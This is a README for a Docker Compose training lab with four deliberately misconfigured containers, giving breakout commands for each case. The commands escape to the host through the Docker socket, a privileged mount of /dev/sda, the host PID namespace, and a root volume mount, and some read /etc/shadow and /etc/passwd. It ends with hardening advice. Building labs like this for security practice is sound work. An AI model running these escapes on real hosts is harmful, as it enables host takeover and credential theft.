# Docker Escape Lab

Hands-on Docker Compose lab with four misconfigured containers for practising container breakouts on a local Linux or WSL2 machine.

<p align="center">
  <img src="https://img.shields.io/badge/Docker-20.10%2B-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker" />
  <img src="https://img.shields.io/badge/Linux-Kernel_5.x%2B-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux" />
  <img src="https://img.shields.io/badge/Security-Container_Escape-E95420?style=for-the-badge" alt="Security" />
  <img src="https://img.shields.io/badge/License-MIT-success?style=for-the-badge" alt="License MIT" />
</p>

<p align="center"><strong>English</strong> · <a href="README.vi.md">Tiếng Việt</a></p>

> Lab use only. I built this lab with four insecure container configs on purpose, to test container breakouts locally. Never run these techniques against a system you do not own or have written permission to test.

## Overview

Each service in `docker-compose.yml` isolates one common operational mistake and hides a flag file at `/flag1.txt` through `/flag4.txt`:

| # | Service | Misconfiguration | Breakout path |
|---|---|---|---|
| 1 | `lab-sock-escape` | `-v /var/run/docker.sock:...` | Spawn a host-mounted container and `chroot` |
| 2 | `lab-privileged-escape` | `privileged: true` | Mount the host block device (`/dev/sda`) directly |
| 3 | `lab-pid-escape` | `pid: host` + `SYS_PTRACE` | Walk host rootfs through `/proc/1/root` |
| 4 | `lab-volume-escape` | `-v /:/host:rw` | Write directly to host cron or SSH keys |

## Run it yourself

Requirements: Docker and Docker Compose v2+ on Linux or Windows WSL2.

```bash
git clone https://github.com/Khanh1916/docker-escape-lab.git
cd docker-escape-lab
docker compose up -d
```

Check that all four containers are up:

```bash
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"
```

Run the verification script to confirm every misconfiguration is live:

```bash
sh scripts/verify_all.sh
```

## Breakout steps

### 1. Docker daemon socket

```bash
docker exec -it lab-sock-escape bash

# With Docker CLI
docker run --rm -it -v /:/host alpine chroot /host

# Or with raw curl over the Unix socket
curl -s --unix-socket /var/run/docker.sock http://localhost/version
```

### 2. Privileged container

```bash
docker exec -it lab-privileged-escape bash
lsblk
mkdir -p /mnt/host_disk
mount /dev/sda /mnt/host_disk
head -n 5 /mnt/host_disk/etc/shadow
```

### 3. Shared host PID namespace

```bash
docker exec -it lab-pid-escape bash
ps aux | head -n 10
ls -la /proc/1/root/
head -n 5 /proc/1/root/etc/passwd
```

### 4. Host volume mount

```bash
docker exec -it lab-volume-escape sh
ls -la /host
echo "Escaped via Volume Mount" > /host/tmp/proof_escape.txt
```

## Hardening summary

Never mount `/var/run/docker.sock` into application or CI containers; use Kaniko/Buildah for builds or put `tecnativa/docker-socket-proxy` in front to restrict endpoints to read-only `GET`. Ban `privileged: true`, drop all capabilities with `--cap-drop=ALL`, and mount volumes read-only (`:ro`) whenever possible. Enable `userns-remap` in `/etc/docker/daemon.json` (or run Rootless Docker / Podman) alongside `--read-only --tmpfs /tmp`.

## Teardown

```bash
docker compose down
```

## Walkthrough & License

Full write-up and mechanics: [khanh1916.github.io/notes](https://khanh1916.github.io/notes)

Licensed under the [MIT License](LICENSE).
